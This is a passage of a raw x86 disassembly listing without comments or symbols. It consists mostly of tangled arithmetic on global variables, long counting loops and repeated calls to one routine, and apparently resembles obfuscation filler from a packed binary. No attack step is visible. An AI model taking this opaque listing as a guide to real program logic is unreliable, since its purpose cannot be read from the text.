  429245:	je     0x429250
  429247:	push   0x5c
  429249:	pop    eax
  42924a:	sub    eax,esi
  42924c:	mov    esi,eax
  42924e:	jmp    0x429260
  429250:	lea    esi,[ecx+0x18]
  429253:	jmp    0x429260
  429255:	movzx  eax,si
  429258:	sub    eax,ecx
  42925a:	inc    eax
  42925b:	mov    ds:0x43e058,eax
  429260:	push   0x0
  429262:	push   0x5c
  429264:	push   edx
  429265:	push   edi
  429266:	call   0x437b80
  42926b:	xor    ecx,ecx
  42926d:	cmp    ebx,eax
  42926f:	jne    0x429275
  429271:	cmp    ecx,edx
  429273:	je     0x42927e
  429275:	mov    ecx,ebx
  429277:	sub    ecx,edi
  429279:	add    ecx,0x2e
  42927c:	jmp    0x429282
  42927e:	lea    ecx,[edi+ebx*1+0x4]
  429282:	xor    eax,eax
  429284:	lea    edi,[ebx-0x3222]
  42928a:	push   eax
  42928b:	mov    DWORD PTR [esp+0x14],edi
  42928f:	sub    edi,DWORD PTR ds:0x43e098
  429295:	mov    DWORD PTR [esp+0x18],eax
  429299:	pop    edx
  42929a:	sbb    eax,edx
  42929c:	lea    ebp,[esi+ecx*1+0x4]
  4292a0:	mov    ds:0x43e09c,eax
  4292a5:	mov    eax,ebp
  4292a7:	dec    eax
  4292a8:	jne    0x4292be
  4292aa:	movzx  ebp,si
  4292ad:	sub    ebp,DWORD PTR ds:0x43e058
  4292b3:	inc    ebp
  4292b4:	mov    DWORD PTR ds:0x43e058,ebp
  4292ba:	lea    ebp,[esi+ebp*1+0x1f]
  4292be:	push   0x48
  4292c0:	xor    edx,edx
  4292c2:	mov    eax,ebp
  4292c4:	pop    esi
  4292c5:	div    esi
  4292c7:	cmp    eax,0x65
  4292ca:	jbe    0x4292dc
  4292cc:	movzx  eax,cl
  4292cf:	add    eax,DWORD PTR ds:0x43e058
  4292d5:	lea    ebp,[eax+ebp*2+0x3efd]
  4292dc:	mov    esi,DWORD PTR [esp+0x14]
  4292e0:	movzx  eax,cl
  4292e3:	lea    edx,[eax+ebp*1-0xe]
  4292e7:	mov    eax,DWORD PTR [esp+0x10]
  4292eb:	sub    eax,edi
  4292ed:	sbb    esi,DWORD PTR ds:0x43e09c
  4292f3:	mov    edi,ecx
  4292f5:	dec    edi
  4292f6:	mov    DWORD PTR ds:0x43e09c,esi
  4292fc:	je     0x429328
  4292fe:	sub    edi,0x12
  429301:	je     0x429321
  429303:	xor    edi,edi
  429305:	xor    ebp,ebp
  429307:	lea    esi,[ecx+0x2e]
  42930a:	sub    esi,ecx
  42930c:	sbb    edi,ebp
  42930e:	sub    esi,eax
  429310:	sbb    edi,DWORD PTR ds:0x43e09c
  429316:	add    esi,0x2e
  429319:	adc    edi,ebp
  42931b:	mov    eax,esi
  42931d:	mov    esi,edi
  42931f:	jmp    0x429334
  429321:	lea    eax,[ebx+0x18]
  429324:	xor    esi,esi
  429326:	jmp    0x429334
  429328:	movzx  ecx,ax
  42932b:	sub    ecx,ebx
  42932d:	inc    ecx
  42932e:	mov    ebx,ecx
  429330:	lea    ecx,[eax+ebx*1+0x1f]
  429334:	and    DWORD PTR [esp+0x14],0x0
  429339:	lea    ebp,[ebx-0x3222]
  42933f:	mov    DWORD PTR [esp+0x10],ebp
  429343:	sub    ebp,eax
  429345:	mov    eax,DWORD PTR [esp+0x14]
  429349:	sbb    eax,esi
  42934b:	mov    esi,DWORD PTR ds:0x43e058
  429351:	mov    edi,edx
  429353:	imul   edi,edi,0x5c
  429356:	cmp    esi,edi
  429358:	je     0x429361
  42935a:	sub    esi,edx
  42935c:	add    esi,0x2e
  42935f:	jmp    0x429365
  429361:	lea    esi,[esi+edx*1+0x4]
  429365:	mov    DWORD PTR ds:0x43e094,esi
  42936b:	xor    edi,edi
  42936d:	mov    esi,ecx
  42936f:	add    esi,ebp
  429371:	adc    edi,eax
  429373:	add    esi,0x32
  429376:	adc    edi,0x0
  429379:	cmp    esi,ebx
  42937b:	jne    0x429387
  42937d:	xor    esi,esi
  42937f:	cmp    edi,esi
  429381:	jne    0x429387
  429383:	lea    ecx,[ebx+ebp*1+0x1f]
  429387:	push   0x0
  429389:	movzx  esi,cx
  42938c:	push   0x5c
  42938e:	push   eax
  42938f:	sub    esi,edx
  429391:	add    esi,DWORD PTR ds:0x43e094
  429397:	push   ebp
  429398:	call   0x437b80
  42939d:	cmp    ebx,eax
  42939f:	jne    0x4293a7
  4293a1:	xor    eax,eax
  4293a3:	cmp    eax,edx
  4293a5:	je     0x4293b0
  4293a7:	mov    edi,ebx
  4293a9:	sub    edi,ebp
  4293ab:	add    edi,0x2e
  4293ae:	jmp    0x4293b4
  4293b0:	lea    edi,[ebx+ebp*1+0x4]
  4293b4:	movzx  eax,bl
  4293b7:	lea    ecx,[edi+ebx*1-0x32]
  4293bb:	xor    edx,edx
  4293bd:	cmp    ecx,0x23e
  4293c3:	lea    eax,[eax+edi*1-0xe]
  4293c7:	jb     0x4293d0
  4293c9:	mov    eax,ebx
  4293cb:	sub    eax,edi
  4293cd:	add    eax,0x2e
  4293d0:	xor    ecx,ecx
  4293d2:	mov    ebp,edi
  4293d4:	sub    ebp,eax
  4293d6:	sbb    ecx,edx
  4293d8:	movzx  eax,bx
  4293db:	cdq    
  4293dc:	add    ebp,eax
  4293de:	adc    ecx,edx
  4293e0:	lea    eax,[esi+edi*1+0x1f]
  4293e4:	dec    eax
  4293e5:	mov    DWORD PTR ds:0x43e09c,ecx
  4293eb:	je     0x429406
  4293ed:	sub    eax,0x12
  4293f0:	je     0x4293fb
  4293f2:	push   0x5c
  4293f4:	pop    eax
  4293f5:	sub    eax,esi
  4293f7:	mov    esi,eax
  4293f9:	jmp    0x429415
  4293fb:	mov    esi,DWORD PTR ds:0x43e058
  429401:	add    esi,0x18
  429404:	jmp    0x429415
  429406:	movzx  eax,si
  429409:	sub    eax,DWORD PTR ds:0x43e058
  42940f:	inc    eax
  429410:	mov    ds:0x43e058,eax
  429415:	push   0x48
  429417:	xor    edx,edx
  429419:	mov    eax,edi
  42941b:	pop    ecx
  42941c:	div    ecx
  42941e:	cmp    eax,0x65
  429421:	jbe    0x42942d
  429423:	lea    eax,[ebx+ebp*1]
  429426:	lea    edi,[edi+eax*1+0x3ef9]
  42942d:	mov    edx,DWORD PTR [esp+0x10]
  429431:	mov    eax,DWORD PTR [esp+0x14]
  429435:	mov    ecx,DWORD PTR ds:0x43e058
  42943b:	sub    edx,ebp
  42943d:	sbb    eax,DWORD PTR ds:0x43e09c
  429443:	lea    edi,[esi+edi*1+0x1f]
  429447:	mov    ds:0x43e09c,eax
  42944c:	lea    eax,[ecx+edi*1-0x32]
  429450:	cmp    eax,0x23e
  429455:	mov    DWORD PTR ds:0x43e098,edx
  42945b:	jb     0x429464
  42945d:	mov    esi,ecx
  42945f:	sub    esi,edi
  429461:	add    esi,0x2e
  429464:	mov    eax,ebx
  429466:	sub    eax,edx
  429468:	add    eax,0x2e
  42946b:	mov    edi,eax
  42946d:	dec    edi
  42946e:	je     0x4294b5
  429470:	sub    edi,0x12
  429473:	je     0x4294a3
  429475:	xor    edi,edi
  429477:	xor    ebp,ebp
  429479:	lea    ecx,[eax+0x2e]
  42947c:	sub    ecx,eax
  42947e:	sbb    edi,ebp
  429480:	sub    ecx,edx
  429482:	sbb    edi,DWORD PTR ds:0x43e09c
  429488:	add    ecx,0x2e
  42948b:	mov    edx,ecx
  42948d:	mov    ecx,DWORD PTR ds:0x43e058
  429493:	adc    edi,ebp
  429495:	mov    DWORD PTR ds:0x43e098,edx
  42949b:	mov    DWORD PTR ds:0x43e09c,edi
  4294a1:	jmp    0x4294c1
  4294a3:	and    DWORD PTR ds:0x43e09c,0x0
  4294aa:	lea    edx,[ebx+0x18]
  4294ad:	mov    DWORD PTR ds:0x43e098,edx
  4294b3:	jmp    0x4294c1
  4294b5:	movzx  eax,dx
  4294b8:	sub    eax,ebx
  4294ba:	inc    eax
  4294bb:	mov    ebx,eax
  4294bd:	lea    eax,[edx+ebx*1+0x1f]
  4294c1:	sub    eax,esi
  4294c3:	mov    edi,ebx
  4294c5:	sub    eax,0x3222
  4294ca:	sub    edi,edx
  4294cc:	mov    esi,eax
  4294ce:	add    edi,0x2e
  4294d1:	mov    DWORD PTR [esp+0x10],0x3c
  4294d9:	cmp    ecx,esi
  4294db:	je     0x42950a
  4294dd:	lea    eax,[ecx+esi*1+0x5]
  4294e1:	cmp    eax,0x39b
  4294e6:	je     0x42950a
  4294e8:	lea    ebp,[eax+esi*1+0x32]
  4294ec:	cmp    ebp,ecx
  4294ee:	jne    0x4294f4
  4294f0:	lea    eax,[ecx+esi*1+0x1f]
  4294f4:	add    DWORD PTR [esp+0x10],0x5
  4294f9:	cmp    DWORD PTR [esp+0x10],0xc4f
  429501:	movzx  esi,cl
  429504:	lea    esi,[esi+eax*1+0x4]
  429508:	jl     0x4294d9
  42950a:	lea    eax,[edi+ebx*1-0x32]
  42950e:	cmp    eax,0x23e
  429513:	jb     0x429529
  429515:	mov    edx,ebx
  429517:	sub    edx,edi
  429519:	add    edx,0x2e
  42951c:	and    DWORD PTR ds:0x43e09c,0x0
  429523:	mov    DWORD PTR ds:0x43e098,edx
  429529:	lea    ecx,[edx+ebx*1+0x1f]
  42952d:	lea    eax,[esi+ecx*1+0x1f]
  429531:	mov    DWORD PTR ds:0x43e05c,ecx
  429537:	movzx  ecx,cx
  42953a:	pop    edi
  42953b:	sub    ecx,esi
  42953d:	pop    esi
  42953e:	add    ecx,eax
  429540:	pop    ebp
  429541:	mov    ds:0x43e094,eax
  429546:	mov    DWORD PTR ds:0x43e07c,ecx
  42954c:	pop    ebx
  42954d:	pop    ecx
  42954e:	pop    ecx
  42954f:	ret    
  429550:	mov    eax,ds:0x43e07c
  429555:	sub    esp,0x24
  429558:	push   ebx
  429559:	mov    ebx,DWORD PTR ds:0x43e058
  42955f:	push   esi
  429560:	push   edi
  429561:	push   0x3c
  429563:	pop    edx
  429564:	cmp    ebx,eax
  429566:	je     0x429597
  429568:	lea    ecx,[eax+ebx*1+0x5]
  42956c:	cmp    ecx,0x39b
  429572:	je     0x429597
  429574:	lea    esi,[ecx+eax*1+0x32]
  429578:	cmp    esi,ebx
  42957a:	jne    0x429580
  42957c:	lea    ecx,[eax+ebx*1+0x1f]
  429580:	movzx  eax,bl
  429583:	add    edx,0x5
  429586:	cmp    edx,0xc4f
  42958c:	lea    eax,[eax+ecx*1+0x4]
  429590:	mov    ds:0x43e07c,eax
  429595:	jl     0x429564
  429597:	mov    ecx,DWORD PTR ds:0x43e05c
  42959d:	lea    edi,[ecx+eax*1+0x4]
  4295a1:	movzx  eax,WORD PTR [esp+0x34]
  4295a6:	push   ebp
  4295a7:	xor    ebp,ebp
  4295a9:	mov    esi,ecx
  4295ab:	sub    esi,DWORD PTR ds:0x43e098
  4295b1:	cdq    
  4295b2:	sbb    ebp,DWORD PTR ds:0x43e09c
  4295b8:	add    esi,eax
  4295ba:	adc    ebp,edx
  4295bc:	mov    DWORD PTR ds:0x43e09c,ebp
  4295c2:	mov    ebp,DWORD PTR ds:0x43e07c
  4295c8:	mov    DWORD PTR ds:0x43e098,esi
  4295ce:	mov    eax,0x9b9
  4295d3:	dec    edi
  4295d4:	je     0x4295e9
  4295d6:	sub    edi,0x12
  4295d9:	je     0x4295e4
  4295db:	push   0x5c
  4295dd:	pop    edx
  4295de:	sub    edx,ebp
  4295e0:	mov    ebp,edx
  4295e2:	jmp    0x4295f1
  4295e4:	lea    ebp,[ebx+0x18]
  4295e7:	jmp    0x4295f1
  4295e9:	movzx  edx,bp
  4295ec:	sub    edx,ebx
  4295ee:	inc    edx
  4295ef:	mov    ebx,edx
  4295f1:	lea    edi,[ebx+ebp*1+0x5]
  4295f5:	cmp    ebx,edi
  4295f7:	jne    0x42960f
  4295f9:	mov    edx,ebp
  4295fb:	imul   edx,edx,0x5c
  4295fe:	cmp    ebx,edx
  429600:	je     0x42960b
  429602:	mov    edi,ebx
  429604:	sub    edi,ebp
  429606:	add    edi,0x2e
  429609:	jmp    0x42960f
  42960b:	lea    edi,[ebx+ebp*1+0x4]
  42960f:	lea    edx,[edi+ebp*1+0x32]
  429613:	cmp    edx,ebx
  429615:	jne    0x42961b
  429617:	lea    edi,[ebx+ebp*1+0x1f]
  42961b:	dec    eax
  42961c:	jne    0x4295d3
  42961e:	push   0x48
  429620:	xor    edx,edx
  429622:	mov    eax,ecx
  429624:	pop    esi
  429625:	div    esi
  429627:	mov    DWORD PTR ds:0x43e058,ebx
  42962d:	cmp    eax,0x65
  429630:	jbe    0x429644
  429632:	mov    eax,ds:0x43e098
  429637:	mov    edx,DWORD PTR [esp+0x38]
  42963b:	add    eax,edx
  42963d:	lea    ecx,[ecx+eax*1+0x3ef9]
  429644:	mov    esi,ecx
  429646:	sub    esi,ebp
  429648:	movzx  ebp,BYTE PTR [esp+0x38]
  42964d:	sub    esi,0x3222
  429653:	mov    DWORD PTR [esp+0x14],ebp
  429657:	lea    ebp,[ecx+ebp*1-0xe]
  42965b:	xor    edx,edx
  42965d:	mov    DWORD PTR [esp+0x10],0x9b9
  429665:	dec    edi
  429666:	je     0x42967b
  429668:	sub    edi,0x12
  42966b:	je     0x429676
  42966d:	push   0x5c
  42966f:	pop    eax
  429670:	sub    eax,esi
  429672:	mov    esi,eax
  429674:	jmp    0x429683
  429676:	lea    esi,[ebx+0x18]
  429679:	jmp    0x429683
  42967b:	movzx  eax,si
  42967e:	sub    eax,ebx
  429680:	inc    eax
  429681:	mov    ebx,eax
  429683:	lea    edi,[esi+ebx*1+0x5]
  429687:	cmp    ebx,edi
  429689:	jne    0x4296a1
  42968b:	mov    eax,esi
  42968d:	imul   eax,eax,0x5c
  429690:	cmp    ebx,eax
  429692:	je     0x42969d
  429694:	mov    edi,ebx
  429696:	sub    edi,esi
  429698:	add    edi,0x2e
  42969b:	jmp    0x4296a1
  42969d:	lea    edi,[esi+ebx*1+0x4]
  4296a1:	lea    eax,[edi+esi*1+0x32]
  4296a5:	cmp    eax,ebx
  4296a7:	jne    0x4296ad
  4296a9:	lea    edi,[esi+ebx*1+0x1f]
  4296ad:	dec    DWORD PTR [esp+0x10]
  4296b1:	jne    0x429665
  4296b3:	xor    eax,eax
  4296b5:	mov    edi,ecx
  4296b7:	add    edi,ebp
  4296b9:	adc    eax,edx
  4296bb:	mov    edx,DWORD PTR [esp+0x38]
  4296bf:	add    edi,0x32
  4296c2:	adc    eax,0x0
  4296c5:	cmp    edi,edx
  4296c7:	mov    DWORD PTR ds:0x43e058,ebx
  4296cd:	jne    0x4296d9
  4296cf:	xor    edi,edi
  4296d1:	cmp    eax,edi
  4296d3:	jne    0x4296d9
  4296d5:	lea    ecx,[edx+ebp*1+0x1f]
  4296d9:	push   0x3c
  4296db:	pop    edx
  4296dc:	cmp    ebx,esi
  4296de:	je     0x429709
  4296e0:	lea    eax,[esi+ebx*1+0x5]
  4296e4:	cmp    eax,0x39b
  4296e9:	je     0x429709
  4296eb:	lea    edi,[eax+esi*1+0x32]
  4296ef:	cmp    edi,ebx
  4296f1:	jne    0x4296f7
  4296f3:	lea    eax,[esi+ebx*1+0x1f]
  4296f7:	movzx  esi,bl
  4296fa:	add    edx,0x5
  4296fd:	cmp    edx,0xc4f
  429703:	lea    esi,[esi+eax*1+0x4]
  429707:	jl     0x4296dc
  429709:	push   0x48
  42970b:	xor    edx,edx
  42970d:	mov    eax,ecx
  42970f:	pop    edi
  429710:	div    edi
  429712:	cmp    eax,0x65
  429715:	jbe    0x429724
  429717:	mov    eax,DWORD PTR [esp+0x38]
  42971b:	add    eax,ebp
  42971d:	lea    ecx,[ecx+eax*1+0x3ef9]
  429724:	mov    eax,DWORD PTR [esp+0x38]
  429728:	add    ebp,eax
  42972a:	lea    eax,[ecx+ebp*1+0x3ef9]
  429731:	mov    ecx,esi
  429733:	imul   ecx,ecx,0x5c
  429736:	cmp    ebx,ecx
  429738:	mov    ds:0x43e05c,eax
  42973d:	je     0x429748
  42973f:	mov    ecx,ebx
  429741:	sub    ecx,esi
  429743:	add    ecx,0x2e
  429746:	jmp    0x42974c
  429748:	lea    ecx,[esi+ebx*1+0x4]
  42974c:	movzx  edx,al
  42974f:	lea    esi,[edx+ecx*1-0xe]
  429753:	mov    ecx,DWORD PTR [esp+0x14]
  429757:	push   0x48
  429759:	xor    edx,edx
  42975b:	pop    edi
  42975c:	lea    ecx,[ecx+eax*1+0x4]
  429760:	div    edi
  429762:	and    DWORD PTR ds:0x43e09c,0x0
  429769:	mov    ebp,DWORD PTR [esp+0x38]
  42976d:	cmp    eax,0x65
  429770:	jbe    0x429784
  429772:	mov    edx,DWORD PTR ds:0x43e05c
  429778:	lea    eax,[ecx+ebp*1]
  42977b:	lea    edi,[edx+eax*1+0x3ef9]
  429782:	jmp    0x42978a
  429784:	mov    edi,DWORD PTR ds:0x43e05c
  42978a:	lea    eax,[ecx+ebp*1+0x1f]
  42978e:	mov    edx,eax
  429790:	dec    edx
  429791:	lea    edi,[edi+esi*1+0x4]
  429795:	je     0x4297ca
  429797:	sub    edx,0x12
  42979a:	je     0x4297be
  42979c:	xor    esi,esi
  42979e:	xor    ebp,ebp
  4297a0:	lea    edx,[eax+0x2e]
  4297a3:	sub    edx,eax
  4297a5:	sbb    esi,ebp
  4297a7:	sub    edx,ecx
  4297a9:	sbb    esi,DWORD PTR ds:0x43e09c
  4297af:	add    edx,0x2e
  4297b2:	adc    esi,ebp
  4297b4:	mov    ecx,edx
  4297b6:	mov    DWORD PTR ds:0x43e09c,esi
  4297bc:	jmp    0x4297d8
  4297be:	and    DWORD PTR ds:0x43e09c,0x0
  4297c5:	lea    ecx,[ebp+0x18]
  4297c8:	jmp    0x4297dc
  4297ca:	movzx  eax,cx
  4297cd:	sub    eax,ebp
  4297cf:	inc    eax
  4297d0:	mov    DWORD PTR [esp+0x38],eax
  4297d4:	lea    eax,[ecx+eax*1+0x1f]
  4297d8:	mov    ebp,DWORD PTR [esp+0x38]
  4297dc:	lea    esi,[ebp-0x3222]
  4297e2:	xor    ebp,ebp
  4297e4:	sub    esi,ecx
  4297e6:	sbb    ebp,DWORD PTR ds:0x43e09c
  4297ec:	movzx  edx,al
  4297ef:	lea    edx,[edx+edi*1-0xe]
  4297f3:	mov    DWORD PTR ds:0x43e09c,ebp
  4297f9:	mov    DWORD PTR [esp+0x10],0x3c
  429801:	cmp    ebx,edx
  429803:	je     0x429833
  429805:	lea    edi,[edx+ebx*1+0x5]
  429809:	cmp    edi,0x39b
  42980f:	je     0x429833
  429811:	lea    ecx,[edi+edx*1+0x32]
  429815:	cmp    ecx,ebx
  429817:	jne    0x42981d
  429819:	lea    edi,[edx+ebx*1+0x1f]
  42981d:	add    DWORD PTR [esp+0x10],0x5
  429822:	cmp    DWORD PTR [esp+0x10],0xc4f
  42982a:	movzx  ecx,bl
  42982d:	lea    edx,[ecx+edi*1+0x4]
  429831:	jl     0x429801
  429833:	mov    DWORD PTR [esp+0x14],0x9b9
  42983b:	mov    ecx,eax
  42983d:	dec    ecx
  42983e:	je     0x429872
  429840:	sub    ecx,0x12
  429843:	je     0x429867
  429845:	xor    ebp,ebp
  429847:	xor    edx,edx
  429849:	lea    ecx,[eax+0x2e]
  42984c:	sub    ecx,eax
  42984e:	sbb    ebp,edx
  429850:	sub    ecx,esi
  429852:	sbb    ebp,DWORD PTR ds:0x43e09c
  429858:	add    ecx,0x2e
  42985b:	adc    ebp,edx
  42985d:	mov    esi,ecx
  42985f:	mov    DWORD PTR ds:0x43e09c,ebp
  429865:	jmp    0x42987e
  429867:	mov    esi,DWORD PTR [esp+0x38]
  42986b:	add    esi,0x18
  42986e:	xor    ebp,ebp
  429870:	jmp    0x42985f
  429872:	movzx  eax,si
  429875:	sub    eax,DWORD PTR [esp+0x38]
  429879:	inc    eax
  42987a:	mov    DWORD PTR [esp+0x38],eax
  42987e:	mov    ecx,DWORD PTR [esp+0x38]
  429882:	lea    eax,[esi+ecx*1]
  429885:	mov    DWORD PTR [esp+0x10],eax
  429889:	add    eax,0x5
  42988c:	cmp    ecx,eax
  42988e:	jne    0x4298b9
  429890:	push   0x0
  429892:	push   0x5c
  429894:	push   ebp
  429895:	push   esi
  429896:	call   0x437b80
  42989b:	xor    ecx,ecx
  42989d:	cmp    DWORD PTR [esp+0x38],eax
  4298a1:	jne    0x4298a7
  4298a3:	cmp    ecx,edx
  4298a5:	je     0x4298b2
  4298a7:	mov    eax,DWORD PTR [esp+0x38]
  4298ab:	sub    eax,esi
  4298ad:	add    eax,0x2e
  4298b0:	jmp    0x4298b9
  4298b2:	mov    eax,DWORD PTR [esp+0x10]
  4298b6:	add    eax,0x4
  4298b9:	xor    edx,edx
  4298bb:	mov    ecx,eax
  4298bd:	add    ecx,esi
  4298bf:	adc    edx,ebp
  4298c1:	add    ecx,0x32
  4298c4:	adc    edx,0x0
  4298c7:	cmp    ecx,DWORD PTR [esp+0x38]
  4298cb:	mov    DWORD PTR [esp+0x28],edx
  4298cf:	jne    0x4298de
  4298d1:	xor    ecx,ecx
  4298d3:	cmp    edx,ecx
  4298d5:	jne    0x4298de
  4298d7:	mov    eax,DWORD PTR [esp+0x10]
  4298db:	add    eax,0x1f
  4298de:	dec    DWORD PTR [esp+0x14]
  4298e2:	jne    0x42983b
  4298e8:	movzx  ecx,al
  4298eb:	lea    ecx,[ecx+edi*1+0x4]
  4298ef:	mov    DWORD PTR ds:0x43e07c,ecx
  4298f5:	mov    ecx,DWORD PTR [esp+0x38]
  4298f9:	add    ecx,0xffffcdde
  4298ff:	xor    edx,edx
  429901:	mov    DWORD PTR [esp+0x24],ecx
  429905:	sub    ecx,esi
  429907:	mov    DWORD PTR [esp+0x28],edx
  42990b:	sbb    edx,ebp
  42990d:	xor    esi,esi
  42990f:	mov    ebp,eax
  429911:	add    ebp,ecx
  429913:	adc    esi,edx
  429915:	mov    edx,DWORD PTR [esp+0x38]
  429919:	add    ebp,0x32
  42991c:	adc    esi,0x0
  42991f:	cmp    ebp,edx
  429921:	mov    DWORD PTR [esp+0x1c],ebp
  429925:	jne    0x429935
  429927:	xor    edx,edx
  429929:	cmp    esi,edx
  42992b:	jne    0x429935
  42992d:	mov    eax,DWORD PTR [esp+0x38]
  429931:	lea    eax,[ecx+eax*1+0x1f]
  429935:	movzx  ecx,BYTE PTR [esp+0x38]
  42993a:	movzx  esi,ax
  42993d:	sub    esi,DWORD PTR ds:0x43e07c
  429943:	lea    eax,[ecx+eax*1-0xe]
  429947:	add    esi,edi
  429949:	mov    edx,esi
  42994b:	imul   edx,edx,0x5c
  42994e:	xor    ecx,ecx
  429950:	cmp    ebx,edx
  429952:	je     0x42995d
  429954:	mov    edi,ebx
  429956:	sub    edi,esi
  429958:	add    edi,0x2e
  42995b:	jmp    0x429961
  42995d:	lea    edi,[esi+ebx*1+0x4]
  429961:	mov    esi,DWORD PTR [esp+0x24]
  429965:	sub    esi,eax
  429967:	mov    eax,DWORD PTR [esp+0x28]
  42996b:	push   0x0
  42996d:	sbb    eax,ecx
  42996f:	push   0x5c
  429971:	push   eax
  429972:	push   esi
  429973:	mov    DWORD PTR ds:0x43e098,esi
  429979:	mov    ds:0x43e09c,eax
  42997e:	call   0x437b80
  429983:	mov    ecx,edx
  429985:	mov    edx,DWORD PTR [esp+0x38]
  429989:	cmp    edx,eax
  42998b:	jne    0x429993
  42998d:	xor    eax,eax
  42998f:	cmp    eax,ecx
  429991:	je     0x4299a2
  429993:	mov    ecx,edx
  429995:	sub    ecx,esi
  429997:	add    ecx,0x2e
  42999a:	mov    DWORD PTR ds:0x43e05c,ecx
  4299a0:	jmp    0x4299ad
  4299a2:	lea    eax,[esi+edx*1+0x4]
  4299a6:	mov    ds:0x43e05c,eax
  4299ab:	mov    ecx,eax
  4299ad:	movzx  eax,cl
  4299b0:	lea    eax,[eax+edi*1-0xe]
  4299b4:	mov    edi,ecx
  4299b6:	sub    edi,eax
  4299b8:	mov    ds:0x43e07c,eax
  4299bd:	xor    ebp,ebp
  4299bf:	add    edi,0x2e
  4299c2:	movzx  eax,dx
  4299c5:	mov    esi,ecx
  4299c7:	sub    esi,DWORD PTR ds:0x43e098
  4299cd:	cdq    
  4299ce:	sbb    ebp,DWORD PTR ds:0x43e09c
  4299d4:	add    esi,eax
  4299d6:	adc    ebp,edx
  4299d8:	dec    edi
  4299d9:	mov    DWORD PTR ds:0x43e09c,ebp
  4299df:	je     0x4299f6
  4299e1:	sub    edi,0x12
  4299e4:	je     0x4299f1
  4299e6:	push   0x5c
  4299e8:	pop    eax
  4299e9:	sub    eax,DWORD PTR ds:0x43e07c
  4299ef:	jmp    0x429a0d
  4299f1:	lea    eax,[ebx+0x18]
  4299f4:	jmp    0x429a0d
  4299f6:	movzx  eax,WORD PTR ds:0x43e07c
  4299fd:	sub    eax,ebx
  4299ff:	inc    eax
  429a00:	mov    ebx,eax
  429a02:	mov    eax,ds:0x43e07c
  429a07:	mov    DWORD PTR ds:0x43e058,ebx
  429a0d:	mov    edx,DWORD PTR ds:0x43e05c
  429a13:	sub    ecx,eax
  429a15:	mov    eax,DWORD PTR [esp+0x38]
  429a19:	sub    ecx,0x3222
  429a1f:	add    eax,esi
  429a21:	lea    edi,[edx+eax*1+0x3ef9]
  429a28:	mov    DWORD PTR [esp+0x10],0x3c
  429a30:	cmp    ebx,ecx
  429a32:	je     0x429a61
  429a34:	lea    eax,[ecx+ebx*1+0x5]
  429a38:	cmp    eax,0x39b
  429a3d:	je     0x429a61
  429a3f:	lea    edx,[eax+ecx*1+0x32]
  429a43:	cmp    edx,ebx
  429a45:	jne    0x429a4b
  429a47:	lea    eax,[ecx+ebx*1+0x1f]
  429a4b:	add    DWORD PTR [esp+0x10],0x5
  429a50:	cmp    DWORD PTR [esp+0x10],0xc4f
  429a58:	movzx  ecx,bl
  429a5b:	lea    ecx,[ecx+eax*1+0x4]
  429a5f:	jl     0x429a30
  429a61:	mov    eax,edi
  429a63:	dec    eax
  429a64:	je     0x429a92
  429a66:	sub    eax,0x12
  429a69:	je     0x429a87
  429a6b:	xor    ebp,ebp
  429a6d:	xor    edx,edx
  429a6f:	lea    eax,[edi+0x2e]
  429a72:	sub    eax,edi
  429a74:	sbb    ebp,edx
  429a76:	sub    eax,esi
  429a78:	sbb    ebp,DWORD PTR ds:0x43e09c
  429a7e:	add    eax,0x2e
  429a81:	adc    ebp,edx
  429a83:	mov    esi,eax
  429a85:	jmp    0x429aa2
  429a87:	mov    esi,DWORD PTR [esp+0x38]
  429a8b:	add    esi,0x18
  429a8e:	xor    ebp,ebp
  429a90:	jmp    0x429aa2
  429a92:	movzx  eax,si
  429a95:	sub    eax,DWORD PTR [esp+0x38]
  429a99:	inc    eax
  429a9a:	mov    DWORD PTR [esp+0x38],eax
  429a9e:	lea    edi,[esi+eax*1+0x1f]
  429aa2:	movzx  eax,WORD PTR [esp+0x38]
  429aa7:	and    DWORD PTR [esp+0x20],0x0
  429aac:	cdq    
  429aad:	mov    DWORD PTR [esp+0x28],edx
  429ab1:	mov    edx,eax
  429ab3:	mov    DWORD PTR [esp+0x24],eax
  429ab7:	mov    eax,DWORD PTR [esp+0x28]
  429abb:	sub    edx,esi
  429abd:	sbb    eax,ebp
  429abf:	add    edx,edi
  429ac1:	adc    eax,DWORD PTR [esp+0x20]
  429ac5:	mov    DWORD PTR [esp+0x10],0x3c
  429acd:	cmp    ebx,ecx
  429acf:	je     0x429aff
  429ad1:	lea    esi,[ecx+ebx*1+0x5]
  429ad5:	cmp    esi,0x39b
  429adb:	je     0x429aff
  429add:	lea    ebp,[esi+ecx*1+0x32]
  429ae1:	cmp    ebp,ebx
  429ae3:	jne    0x429ae9
  429ae5:	lea    esi,[ecx+ebx*1+0x1f]
  429ae9:	add    DWORD PTR [esp+0x10],0x5
  429aee:	cmp    DWORD PTR [esp+0x10],0xc4f
  429af6:	movzx  ecx,bl
  429af9:	lea    ecx,[ecx+esi*1+0x4]
  429afd:	jl     0x429acd
  429aff:	mov    esi,DWORD PTR [esp+0x20]
  429b03:	mov    ebp,edi
  429b05:	add    ebp,edx
  429b07:	adc    esi,eax
  429b09:	mov    eax,DWORD PTR [esp+0x38]
  429b0d:	add    ebp,0x32
  429b10:	mov    DWORD PTR [esp+0x14],ebp
  429b14:	push   0x0
  429b16:	pop    ebp
  429b17:	adc    esi,ebp
  429b19:	cmp    DWORD PTR [esp+0x14],eax
  429b1d:	jne    0x429b2d
  429b1f:	xor    eax,eax
  429b21:	cmp    esi,eax
  429b23:	jne    0x429b2d
  429b25:	mov    eax,DWORD PTR [esp+0x38]
  429b29:	lea    edi,[edx+eax*1+0x1f]
  429b2d:	mov    eax,edi
  429b2f:	sub    eax,ecx
  429b31:	add    eax,0x2e
  429b34:	lea    edx,[eax+ebx*1-0x32]
  429b38:	cmp    edx,0x23e
  429b3e:	jb     0x429b47
  429b40:	mov    ecx,ebx
  429b42:	sub    ecx,eax
  429b44:	add    ecx,0x2e
  429b47:	movzx  eax,BYTE PTR [esp+0x38]
  429b4c:	mov    esi,edi
  429b4e:	sub    esi,ecx
  429b50:	mov    DWORD PTR [esp+0x14],eax
  429b54:	lea    eax,[eax+edi*1-0xe]
  429b58:	xor    edx,edx
  429b5a:	add    esi,0x2e
  429b5d:	sub    edi,eax
  429b5f:	sbb    edx,ebp
  429b61:	add    edi,DWORD PTR [esp+0x24]
  429b65:	push   0x3c
  429b67:	adc    edx,DWORD PTR [esp+0x2c]
  429b6b:	pop    eax
  429b6c:	cmp    ebx,ecx
  429b6e:	je     0x429b99
  429b70:	lea    esi,[ecx+ebx*1+0x5]
  429b74:	cmp    esi,0x39b
  429b7a:	je     0x429b99
  429b7c:	lea    ebp,[esi+ecx*1+0x32]
  429b80:	cmp    ebp,ebx
